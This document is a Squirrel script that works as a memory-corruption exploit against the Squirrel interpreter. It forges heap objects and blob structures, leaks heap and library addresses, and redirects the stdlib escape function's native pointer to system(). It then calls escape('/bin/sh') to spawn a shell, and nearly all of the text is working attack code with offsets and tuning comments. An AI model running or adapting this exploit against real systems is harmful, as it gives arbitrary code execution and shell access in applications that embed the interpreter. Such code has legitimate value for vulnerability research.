/* Heap offsets */
BLOB1_OFFSET <- 0x22df0
BLOB1_CONTENT_OFFSET <- BLOB1_OFFSET + 0xb0
/* Library offsets */
SYSTEM_OFFSET <- 0xef90
ESCAPE_OFFSET <- 0xd8c0
VPTR_BLOB_OFFSET <- 0x20d270

blob_1 <- blob(1000)

p64 <- function(blb, val)
{
	for (local i = 0; i < 8; i++) {
		blb.writen(val & 0xff, 'b')
		val = val >> 8
	}
}

create_stackobj <- function(blb, type_, ptr)
{
	blb.writen(type_, 'i') // type
	blb.writen(0, 'i')     // padding
	p64(blb, ptr)          // object pointer
}

create_instance <- function(blb, class_addr, userptr)
{
	p64(blb, 0xdeadbeef) // _vptr.SQRefCounted
	p64(blb, 100)        // _uiRef
	p64(blb, 0)          // _weakref
	p64(blb, 0)          // _next
	p64(blb, 0)          // _prev
	p64(blb, 0)          // _sharedstate
	p64(blb, 0)          // _delegate
	p64(blb, class_addr) // _class
	p64(blb, userptr)    // _userpointer
	p64(blb, 0xdeadbeef) // _hook
	p64(blb, 104)        // _memsize
	p64(blb, 0)          // _values pt1
	p64(blb, 0)          // _values pt2
}

create_blob <- function(blb, base_addr, size, offset, vptr)
{
	p64(blb, vptr)       // _vptr.SQStream
	p64(blb, size)       // _size
	p64(blb, size)       // _allocated
	p64(blb, offset)     // _ptr
	p64(blb, base_addr)  // _buf
	p64(blb, 1)          // _owns
}

escape_addr <- escape.tostring().slice(14, -1).tointeger(16)
blob_cls_addr <- blob.tostring().slice(11, -1).tointeger(16)
blob_inst_addr <- blob_1.tostring().slice(14, -1).tointeger(16)
heap_base <- blob_inst_addr - BLOB1_OFFSET

create_stackobj(blob_1, 0x0a008000, heap_base + BLOB1_CONTENT_OFFSET + 16)
create_instance(blob_1, blob_cls_addr, heap_base + BLOB1_CONTENT_OFFSET + 120)

print("stdlib _string_escape: " + escape + "\n")
print("stdlib blob class: " + blob + "\n")
print("blob_1: " + blob_1 + "\n")

/*
 * This is the core of the exploit. The offsets need to be adjusted outside
 * of the compiler.
 *
 * In our case the offsets need to be:
 *   - 49 08 00 00 (blob_1 instance + offset to _hook) -> leaking lib
 *   - 50 08 00 00 (blob_1 data)
 */
blob_2 <- blob(1024)
a <- [blob_2, blob_2]
vptr <- ("" + a[0]).slice(12, -1).tointeger(16) + VPTR_BLOB_OFFSET
heap <- a[1]

print("Leaked ptr: " + a[0] + "\n")
print("Heap blob: " + heap + "\n")

create_blob(blob_1, heap_base, 0x42000, escape_addr - heap_base, vptr)

// EXPLOIT
heap.seek(104, 'c') // Seek to _function within SQNativeClosure
lower <- heap.readn('i')
heap.seek(-4, 'c')
heap.writen(lower - ESCAPE_OFFSET + SYSTEM_OFFSET, 'i')

escape("/bin/sh")
